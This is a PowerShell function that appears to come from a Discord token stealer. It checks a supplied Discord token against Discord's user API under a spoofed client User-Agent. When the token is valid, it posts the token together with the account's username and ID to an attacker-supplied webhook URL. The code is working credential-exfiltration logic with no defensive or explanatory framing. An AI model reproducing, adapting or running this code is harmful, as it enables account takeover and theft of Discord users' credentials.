function checktoken 
{
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$True)]
        [string]$token,
        [parameter(Position=1,Mandatory=$True)]
        [string]$hookUrl
    )
    
    try {
        $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
        -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $token} -UseBasicParsing -EV Err -EA SilentlyContinue
    } catch {
        # $_.Exception.Response.StatusCode.Value__
    }
    if ($r.statusCode -eq "200") 
    {
        $tmpID = $r.content | ConvertFrom-Json | Select-Object id
        $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
        $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
        $user = $tmpUsername.username+"#"+$tmpTag.discriminator
        $id = $tmpID.id
        $possibleTokens += @([pscustomobject]@{Type="MFA";Location="DiscordStable";Token=$token;User=$user;ID=$id})
        $payload = [PSCustomObject]@{content = $possibleTokens}
        Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'
    }
    $id=""
    $tmpID=""
    $user=""
    $r=""
}
